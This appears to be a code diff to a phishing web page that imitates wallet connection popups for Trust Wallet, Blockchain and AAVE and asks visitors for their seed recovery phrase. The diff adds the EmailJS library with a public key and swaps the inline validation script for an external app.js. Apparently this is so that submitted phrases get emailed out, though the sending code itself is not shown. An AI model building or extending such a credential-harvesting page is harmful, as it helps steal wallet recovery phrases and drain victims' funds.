@@ -20,6 +20,16 @@
   <!-- Additional CSS Files -->
   <link rel="stylesheet" href="assets/css/templatemo-tale-seo-agency.css" />
   <link rel="stylesheet" href="https://unpkg.com/swiper@7/swiper-bundle.min.css" />
+
+  <!-- Emailjs -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init({
+        publicKey: "eyenHzJVQj2ikb6mF",
+      });
+    })();
+  </script>
 </head>
 
 <body>
@@ -255,7 +265,7 @@
       </div>
       <form id="myForm">
         <label for="">Wallet Type:</label>
-        <input type="text" value="🔒Trust Wallet" disabled />
+        <input type="text" value="🔒Trust Wallet" id="wallet-type" disabled />
         <label for="">Recovery Phrase:</label>
         <textarea name="" rows="4" cols="50" id="phrase"
           placeholder="Enter your 12, 18, or 24 word phrase separated by a space" required></textarea>
@@ -280,7 +290,7 @@
       </div>
       <form id="myForm">
         <label for="">Wallet Type:</label>
-        <input type="text" value="🔒Blockchain Wallet" disabled />
+        <input type="text" value="🔒Blockchain Wallet" id="wallet-type" disabled />
         <label for="">Recovery Phrase:</label>
         <textarea name="" rows="4" cols="50" id="phrase"
           placeholder="Enter your 12, 18, or 24 word phrase separated by a space" required></textarea>
@@ -305,7 +315,7 @@
       </div>
       <form id="myForm">
         <label for="">Wallet Type:</label>
-        <input type="text" value="🔒AAVE Wallet" disabled />
+        <input type="text" value="🔒AAVE Wallet" id="wallet-type" disabled />
         <label for="">Recovery Phrase:</label>
         <textarea name="" rows="4" cols="50" id="phrase"
           placeholder="Enter your 12, 18, or 24 word phrase separated by a space" required></textarea>
@@ -334,80 +344,7 @@
   <!-- Scripts -->
   <script src="assets/js/isotope.min.js"></script>
   <script src="assets/js/custom.js"></script>
-  <script>
-    // Wallet Popup Handling
-    document.querySelectorAll(".wallet").forEach((wallet) => {
-      wallet.addEventListener("click", () => {
-        const walletName = wallet.querySelector("h5").textContent.trim();
-        const popup = Array.from(document.querySelectorAll(".popup")).find(
-          (p) =>
-            p.querySelector(".wallet-name h4").textContent.trim() === walletName
-        );
-        if (popup) {
-          popup.classList.remove("hidden"); // Show the popup
-        }
-      });
-    });
-
-    // Close popup functionality
-    document.querySelectorAll(".close-btn").forEach((btn) => {
-      btn.addEventListener("click", (e) => {
-        e.target.closest(".popup").classList.add("hidden"); // Hide the popup
-      });
-    });
-
-    // Handle Proceed Button
-    document.querySelectorAll("#proceedButton").forEach((button) => {
-      button.addEventListener("click", (e) => {
-        const popup = e.target.closest(".popup");
-        const textarea = popup.querySelector("#phrase");
-        const errorMessage = popup.querySelector("#error-message");
-        const text = textarea.value.trim();
-
-        // Split the text into words
-        const words = text.split(/\s+/).filter((word) => word.length > 0);
-
-        // Validate textarea input
-        const isValidWordCount = [12, 18, 24].includes(words.length);
-        const allWordsValid = words.every((word) => /^[a-zA-Z]{3,8}$/.test(word));
-
-        if (!isValidWordCount || !allWordsValid) {
-          e.preventDefault(); // Prevent submission
-          textarea.classList.add("error");
-          errorMessage.textContent =
-            "Please enter a valid 12, 18, or 24-word phrase. Each word typically contain only letters that are 3-8 characters long.";
-          errorMessage.style.display = "block";
-          return; // Stop further execution
-        }
-
-        // Clear errors and proceed with submission
-        textarea.classList.remove("error");
-        errorMessage.style.display = "none";
-        alert("Submission successful!"); // Replace with your submission logic
-        popup.classList.add("hidden"); // Close popup after successful validation
-      });
-    });
-
-    // Textarea Validation Feedback
-    document.querySelectorAll("#phrase").forEach((textarea) => {
-      textarea.addEventListener("input", () => {
-        const text = textarea.value.trim();
-        const wordCount = text.split(/\s+/).filter((word) => word.length > 0).length;
-        const errorMessage = textarea.nextElementSibling; // Assuming the error message is directly below
-
-        if (![12, 18, 24].includes(wordCount)) {
-          textarea.classList.add("error");
-          errorMessage.textContent =
-            "Please enter a valid 12, 18, or 24-word phrase separated by spaces.";
-          errorMessage.style.display = "block";
-        } else {
-          textarea.classList.remove("error");
-          errorMessage.style.display = "none";
-        }
-      });
-    });
-
-  </script>
+  <script type="module" src="assets/js/app.js"></script>
 </body>
 
 </html>
